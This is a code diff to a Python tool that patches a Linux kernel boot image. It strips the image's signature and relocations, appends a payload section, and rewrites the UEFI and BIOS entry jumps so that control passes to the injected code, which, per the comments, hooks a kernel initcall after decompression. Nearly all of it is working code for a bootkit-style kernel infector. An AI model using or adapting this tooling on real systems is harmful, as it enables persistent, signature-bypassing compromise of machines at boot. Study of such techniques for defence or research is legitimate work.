@@ -9,6 +9,7 @@ import pefile
 from keystone import Ks, KS_ARCH_X86, KS_MODE_64, KS_OPT_SYNTAX_ATT
 from binsearch import FixedBytes, SkipBytes, BinSearch
 from pe import PERemoveSig, PECheckSumFix
+from remove_reloc import remove_reloc
 
 
 def assemble(code):
@@ -38,37 +39,89 @@ def uefi_patch(pe_data, offset):
     # mov rsi, rbx
     # add rax, rcx
     # jmp rax
-    bs = BinSearch([FixedBytes(b'\x48\x89\xDE\x48\x01\xC8\xFF\xE0')])
+    bs = BinSearch([
+        FixedBytes(b'\x48\x89\xDE'),
+        FixedBytes(b'\x48\x01\xC8'),
+        FixedBytes(b'\xFF\xE0')
+    ])
     matches = bs.search(pe_data)
 
     assert(len(matches) == 1)
 
     target_jump_offset = matches[0][0]
     dist = offset - target_jump_offset
+    dist -= 32
     # note: we need to do the instructions we replaced in the next stage!!!
     transfer = pad(assemble(f'jmp {hex(dist)}'), 8, before=True, value=b'\x90')
     pe_data[target_jump_offset:target_jump_offset+8] = transfer
     return pe_data
 
 
+def old_uefi_patch(pe_data, offset):
+    bs = BinSearch([
+        FixedBytes(b'\x5e'),
+        FixedBytes(b'\xff\xe0'),
+        FixedBytes(b'\x0f\x1f\x80\x00\x00\x00\x00')
+    ])
+
+    matches = bs.search(pe_data)
+
+    assert(len(matches) == 1)
+
+    target_jump_offset = matches[0][0]
+    dist = offset - target_jump_offset
+    transfer = pad(
+        assemble(f'self: jmp self\njmp {hex(dist)}'),
+        10, before=True, value=b'\x90'
+    )
+    pe_data[target_jump_offset:target_jump_offset+10] = transfer
+    return pe_data
+
+
 def bios_patch(pe_data, offset):
     # Patching for BIOS
+    # end of startup_64
+    # we include some random junk that I *think* comes from code to handle non
+    # 64bit CPUs, so who cares if we trash it.
+    # .Lno_longmode in the kernel tree
+    # Saves us having to call extract_kernel in next stage if overwrite it,
+    # as we need space to pushq and ret.
     bs = BinSearch([
-        FixedBytes(b'\xe8'),
-        SkipBytes(4),
-        FixedBytes(b'\x4c\x89\xfe\xff\xe0')
+        # FixedBytes(b'\x4c\x89\xfe'),
+        FixedBytes(b'\xff\xe0'),
+        FixedBytes(b'\xf4\xeb\xfd\x66\x0f\x1f\x44\x00\x00')
     ])
+    total = 2 + 9
     matches = bs.search(pe_data)
     assert(len(matches) == 1)
 
+    # Address of our code
+    target_addr = 0x100000 + offset - 0x5000
+
+    # Jumping to an exact address
+    to_patch_in = f"""
+        pushq ${hex(target_addr)}
+        ret
+    """
+
+    patch = assemble(to_patch_in)
+    assert(len(patch) < total)
+
     # we'll be jumping back down to an old mapping at a fixed address.
-    pe_data[matches[0][0]:matches[0][0]+2] = b'\xeb\xfe'
-    # pe_data[0x5000:0x5000+2] = b'\xeb\xfe'
-    print(matches[0][0], offset)
+    pe_data[matches[0][0]:matches[0][0]+total] = pad(
+        patch,
+        total, before=True, value=b'\x90'
+    )
+
     return pe_data
 
 
 def add_data(pe_data_orig, data):
+    """
+    Add a new section to store our patch in the PE, then append our data, and
+    install the patches to transfer control to our payload.
+    """
+
     to_add = pad(data, 4096)
 
     pe = pefile.PE(data=pe_data_orig)
@@ -140,6 +193,9 @@ def main():
     # remove the sig
     a = PERemoveSig(a).remove_sig()
 
+    # Remove the reloc section in older kernels
+    a = remove_reloc(a)
+
     # Adding our payload
     # this is the first stage that will patch the kernel after its been
     # decompressed, hooking an initcall and making sure our payload exists in
@@ -147,7 +203,7 @@ def main():
     payload = open('./payload/all.bin', 'rb').read()
     a = add_data(
         a,
-        pad(payload, before=True, value=b'\x90')
+        pad(payload, value=b'\x00')
     )
 
     # Checksum fixes for sanity
